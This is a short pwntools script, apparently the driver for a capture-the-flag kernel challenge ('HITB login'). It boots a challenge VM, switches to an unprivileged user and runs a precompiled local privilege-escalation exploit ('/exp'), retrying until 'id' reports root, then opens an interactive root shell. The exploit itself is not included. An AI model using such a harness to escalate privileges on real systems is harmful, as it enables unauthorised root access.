from pwn import *
context.terminal = ['tmux', 'split', '-h']
context.log_level = "debug"
while True:
	io = process("./launch.sh")
	#gdb.attach(io)
	io.sendlineafter("HITB login:", "root")
	io.sendlineafter("#", "/addtmp.sh")
	io.sendlineafter("$", "su - tmp")
	io.sendlineafter("$", "/exp")
	io.sendlineafter("$", "id")
	io.recvline()
	s = io.recvline()[:-1]
	if b"root" not in s:
		io.kill()
		continue
	log.success("[+] welcome to root")
	io.interactive()
	break
